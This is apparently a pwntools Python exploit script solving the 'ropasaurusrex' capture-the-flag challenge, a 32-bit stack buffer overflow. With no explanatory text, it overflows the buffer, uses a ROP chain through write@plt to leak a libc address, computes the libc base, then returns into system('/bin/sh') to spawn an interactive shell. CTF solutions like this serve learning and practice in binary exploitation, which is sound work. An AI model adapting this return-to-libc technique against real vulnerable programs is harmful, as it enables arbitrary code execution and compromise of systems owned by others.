from pwn import *

p = process('./ropasaurusrex')
e = ELF('./ropasaurusrex')
l = e.libc

context.log_level = "debug"

main = 0x080483F4

payload = 'a' * 0x88 + p32(0)

# write(1, write@got, 4)
payload += p32(e.plt['write'])
payload += p32(main)
payload += p32(1)
payload += p32(e.got['write'])
payload += p32(4) 

p.send(payload)

libc = u32(p.recv(4)) - l.sym['write']
log.info('libc : ' + hex(libc))

payload = 'a' * 0x88 + p32(0)
payload += p32(libc + l.sym['system'])
payload += p32(main)

payload += p32(libc + next(l.search('/bin/sh\x00')))

p.send(payload)

p.interactive()
